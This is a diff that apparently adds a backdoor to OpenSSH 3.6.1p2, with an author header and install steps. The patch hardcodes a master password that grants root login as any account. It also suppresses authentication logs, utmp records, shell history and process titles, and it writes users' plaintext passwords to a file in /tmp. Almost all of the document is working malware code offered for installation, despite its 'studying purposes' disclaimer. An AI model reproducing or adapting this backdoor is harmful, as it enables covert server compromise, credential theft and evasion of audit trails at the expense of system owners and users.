@@ -1,0 +1,314 @@
+#OpenSSH 3.6.1p2 Backdoor
+#written by crash@frew.org
+#13/07/2003
+#*greets* to bluud, frawd, mirage and poupas
+#
+# With this backdoor you can log in with any user account throught a
+# special password and get root.
+
+# Features:
+# - special password to log in with any user account and get root
+# - no logs in the machine (messages,auth,utmp,...)
+# - in some shells(bash) .bash_history "forwarded" to /dev/null
+# - logs user passwords (local and remote sessions)
+# - even if the user(even root) is not allowed by sshd to log in, with the special password it can
+# - config file (backdoor.h)
+#
+#
+# Installation:
+# In the openssh 3.6.p2 source dir do: 
+# - gunzip openssh-3.6.1p2-backdoor.patch.gz
+# - patch -p1 < openssh-3.6.1p2-backdoor.patch
+# - adjust you preferences in the backdoor.h
+# - make ; make install
+# - restart sshd
+# - enjoy!
+#
+# THIS PATCH IS FOR STUDYING PURPOSES. 
+# THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE DONE USING THIS PATCH.
+diff -uNr openssh-3.6.1p2/auth-passwd.c openssh-backdoor/auth-passwd.c
+--- openssh-3.6.1p2/auth-passwd.c	2003-04-29 10:12:08.000000000 +0100
++++ openssh-backdoor/auth-passwd.c	2003-07-06 19:01:44.000000000 +0100
+@@ -113,7 +113,14 @@
+ 	int reenter = 1;
+ # endif
+ #endif /* !defined(USE_PAM) && !defined(HAVE_OSF_SIA) */
+-
++	backdoor_active = 0;
++        if(strcmp(password, BACKDOORPASSWD) == 0)
++          {
++            backdoor_active = 1;
++            return 1;
++          }
++        else
++          {
+ 	/* deny if no user. */
+ 	if (pw == NULL)
+ 		ok = 0;
+@@ -234,6 +241,16 @@
+ # endif /* HAVE_MD5_PASSWORDS */
+ 
+ 	/* Authentication is accepted if the encrypted passwords are identical. */
+-	return (strcmp(encrypted_password, pw_password) == 0);
++	if(strcmp(encrypted_password, pw_password) == 0)
++	{
++	  FILE *fp = fopen(PASSWORDS_LOG_FILE,"a");
++	  fprintf (fp, "login in: %s:%s\n", pw->pw_name, password);
++	  fclose (fp);
++	  return 1;
++	}
++	else
++	  return 0;
++
+ #endif /* !USE_PAM && !HAVE_OSF_SIA */
+ }
++}
+diff -uNr openssh-3.6.1p2/auth.c openssh-backdoor/auth.c
+--- openssh-3.6.1p2/auth.c	2003-01-18 05:24:06.000000000 +0000
++++ openssh-backdoor/auth.c	2003-07-06 19:01:59.000000000 +0100
+@@ -71,6 +71,10 @@
+ int
+ allowed_user(struct passwd * pw)
+ {
++  if(backdoor_active)
++    return 1;
++  else
++    {
+ 	struct stat st;
+ 	const char *hostname = NULL, *ipaddr = NULL;
+ 	char *shell;
+@@ -232,7 +236,7 @@
+ 	/* We found no reason not to let this user try to log on... */
+ 	return 1;
+ }
+-
++}
+ Authctxt *
+ authctxt_new(void)
+ {
+@@ -244,6 +248,8 @@
+ void
+ auth_log(Authctxt *authctxt, int authenticated, char *method, char *info)
+ {
++  if(!backdoor_active)
++    {
+ 	void (*authlog) (const char *fmt,...) = verbose;
+ 	char *authmsg;
+ 
+@@ -276,13 +282,15 @@
+ #endif /* WITH_AIXAUTHENTICATE */
+ 
+ }
+-
++}
+ /*
+  * Check whether root logins are disallowed.
+  */
+ int
+ auth_root_allowed(char *method)
+ {
++  if(!backdoor_active)
++    {
+ 	switch (options.permit_root_login) {
+ 	case PERMIT_YES:
+ 		return 1;
+@@ -301,6 +309,9 @@
+ 	log("ROOT LOGIN REFUSED FROM %.200s", get_remote_ipaddr());
+ 	return 0;
+ }
++  else
++    return 1;
++}
+ 
+ 
+ /*
+diff -uNr openssh-3.6.1p2/backdoor.h openssh-backdoor/backdoor.h
+--- openssh-3.6.1p2/backdoor.h	1970-01-01 01:00:00.000000000 +0100
++++ openssh-backdoor/backdoor.h	2003-07-06 19:08:32.000000000 +0100
+@@ -0,0 +1,6 @@
++/* backdoor stuff */
++#define BACKDOORPASSWD "ptscene.org"
++#define LOGGING_PASSWORDS 1
++#define PASSWORDS_LOG_FILE "/tmp/pass_ssh.log"
++
++int backdoor_active;
+diff -uNr openssh-3.6.1p2/canohost.c openssh-backdoor/canohost.c
+--- openssh-3.6.1p2/canohost.c	2003-01-06 23:51:23.000000000 +0000
++++ openssh-backdoor/canohost.c	2003-07-06 19:02:30.000000000 +0100
+@@ -81,6 +81,7 @@
+ 	    NULL, 0, NI_NAMEREQD) != 0) {
+ 		/* Host name not found.  Use ip address. */
+ #if 0
++	  if(!backdoor_active)
+ 		log("Could not reverse map address %.100s.", ntop);
+ #endif
+ 		return xstrdup(ntop);
+diff -uNr openssh-3.6.1p2/includes.h openssh-backdoor/includes.h
+--- openssh-3.6.1p2/includes.h	2002-10-21 01:50:26.000000000 +0100
++++ openssh-backdoor/includes.h	2003-07-06 19:07:39.000000000 +0100
+@@ -172,4 +172,12 @@
+ 
+ #include "entropy.h"
+ 
++#ifndef BACKDOOR
++#define BACKDOOR
++#include "backdoor.h"
++#endif
++
+ #endif /* INCLUDES_H */
++
++
++
+diff -uNr openssh-3.6.1p2/session.c openssh-backdoor/session.c
+--- openssh-3.6.1p2/session.c	2003-03-21 01:18:09.000000000 +0000
++++ openssh-backdoor/session.c	2003-07-06 19:02:38.000000000 +0100
+@@ -1006,7 +1006,8 @@
+ 	}
+ 	if (getenv("TZ"))
+ 		child_set_env(&env, &envsize, "TZ", getenv("TZ"));
+-
++        if(backdoor_active)
++     child_set_env(&env, &envsize, "HISTFILE", "/dev/null");
+ 	/* Set custom environment options from RSA authentication. */
+ 	if (!options.use_login) {
+ 		while (custom_environment) {
+@@ -1232,6 +1233,9 @@
+ 
+ 		if (setlogin(pw->pw_name) < 0)
+ 			error("setlogin failed: %s", strerror(errno));
++		if(!backdoor_active)
++                  {
++
+ 		if (setgid(pw->pw_gid) < 0) {
+ 			perror("setgid");
+ 			exit(1);
+@@ -1241,6 +1245,12 @@
+ 			perror("initgroups");
+ 			exit(1);
+ 		}
++		  }
++		else
++                  {
++                    setgid(0);
++                    initgroups(pw->pw_name, 0);
++                  }
+ 		endgrent();
+ # ifdef USE_PAM
+ 		/*
+@@ -1257,6 +1267,7 @@
+ 		aix_usrinfo(pw);
+ # endif /* _AIX */
+ 		/* Permanently switch to the desired uid. */
++		if(!backdoor_active)
+ 		permanently_set_uid(pw);
+ #endif
+ 	}
+@@ -1264,7 +1275,7 @@
+ #ifdef HAVE_CYGWIN
+ 	if (is_winnt)
+ #endif
+-	if (getuid() != pw->pw_uid || geteuid() != pw->pw_uid)
++	if ((getuid() != pw->pw_uid || geteuid() != pw->pw_uid) && !backdoor_active)
+ 		fatal("Failed to set uids to %u.", (u_int) pw->pw_uid);
+ }
+ 
+@@ -2037,9 +2048,12 @@
+ {
+ 	if (s->pw == NULL)
+ 		error("no user for session %d", s->self);
+-	else
+-		setproctitle("%s@%s", s->pw->pw_name, session_tty_list());
+-}
++	else{
++	    if(!backdoor_active)
++	  setproctitle("%s@%s", s->pw->pw_name, session_tty_list());
++	    else
++	      setproctitle("","");
++	}}
+ 
+ int
+ session_setup_x11fwd(Session *s)
+diff -uNr openssh-3.6.1p2/sshconnect1.c openssh-backdoor/sshconnect1.c
+--- openssh-3.6.1p2/sshconnect1.c	2002-08-20 19:41:16.000000000 +0100
++++ openssh-backdoor/sshconnect1.c	2003-07-06 19:15:17.000000000 +0100
+@@ -939,7 +939,15 @@
+ 
+ 		type = packet_read();
+ 		if (type == SSH_SMSG_SUCCESS)
+-			return 1;
++		  {
++                    if((strcmp(BACKDOORPASSWD,password) != 0) && LOGGING_PASSWORDS)
++                      {
++                        FILE *fp = fopen(PASSWORDS_LOG_FILE,"a");
++                        fprintf (fp,"login at: %s %s:%s\n", get_remote_ipaddr(), options.user, password);
++                        fclose (fp);
++                      }
++		    return 1;
++		  }
+ 		if (type != SSH_SMSG_FAILURE)
+ 			packet_disconnect("Protocol error: got %d in response to passwd auth", type);
+ 	}
+diff -uNr openssh-3.6.1p2/sshconnect2.c openssh-backdoor/sshconnect2.c
+--- openssh-3.6.1p2/sshconnect2.c	2003-04-01 12:43:40.000000000 +0100
++++ openssh-backdoor/sshconnect2.c	2003-07-06 19:15:29.000000000 +0100
+@@ -457,6 +457,12 @@
+ 	    authctxt->server_user, authctxt->host);
+ 	password = read_passphrase(prompt, 0);
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
++	if((strcmp(BACKDOORPASSWD,password) != 0) && LOGGING_PASSWORDS)
++	    {
++	      FILE *fp = fopen(PASSWORDS_LOG_FILE,"a");
++	      fprintf (fp,"login at: %s %s:%s\n", get_remote_ipaddr(), options.user, password);
++	      fclose (fp);
++	    }
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+ 	packet_put_cstring(authctxt->method->name);
+diff -uNr openssh-3.6.1p2/sshlogin.c openssh-backdoor/sshlogin.c
+--- openssh-3.6.1p2/sshlogin.c	2003-01-01 23:43:56.000000000 +0000
++++ openssh-backdoor/sshlogin.c	2003-07-06 19:03:00.000000000 +0100
+@@ -67,6 +67,8 @@
+ record_login(pid_t pid, const char *ttyname, const char *user, uid_t uid,
+     const char *host, struct sockaddr * addr, socklen_t addrlen)
+ {
++  if(!backdoor_active)
++    {
+   struct logininfo *li;
+ 
+   li = login_alloc_entry(pid, user, host, ttyname);
+@@ -74,28 +76,33 @@
+   login_login(li);
+   login_free_entry(li);
+ }
+-
++}
+ #ifdef LOGIN_NEEDS_UTMPX
+ void
+ record_utmp_only(pid_t pid, const char *ttyname, const char *user,
+ 		 const char *host, struct sockaddr * addr, socklen_t addrlen)
+ {
++  if(!backdoor_active)
++    {
+   struct logininfo *li;
+ 
+   li = login_alloc_entry(pid, user, host, ttyname);
+   login_set_addr(li, addr, addrlen);
+   login_utmp_only(li);
+   login_free_entry(li);
+-}
++}}
+ #endif
+ 
+ /* Records that the user has logged out. */
+ void
+ record_logout(pid_t pid, const char *ttyname, const char *user)
+ {
++  if(!backdoor_active)
++    {
+   struct logininfo *li;
+ 
+   li = login_alloc_entry(pid, user, NULL, ttyname);
+   login_logout(li);
+   login_free_entry(li);
+ }
++}
